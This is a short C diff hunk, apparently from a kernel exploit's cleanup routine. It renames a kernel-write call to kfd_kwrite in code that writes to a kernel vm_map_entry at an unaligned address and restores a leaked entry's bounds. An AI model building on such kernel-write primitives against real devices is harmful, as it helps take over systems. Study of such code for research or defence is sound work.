@@ -500,7 +500,7 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
         u64 unaligned_kaddr = vme_end0_kaddr + offsetof(struct vm_map_entry, links.start) + 1;
         u64 unaligned_uaddr = (u64)(&vme_end0_start_and_next) + 1;
-        kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
+        kfd_kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
         static_kset(struct vm_map_entry, links.end, leaked_entry_end, vme_end0_kaddr);
 
         /*
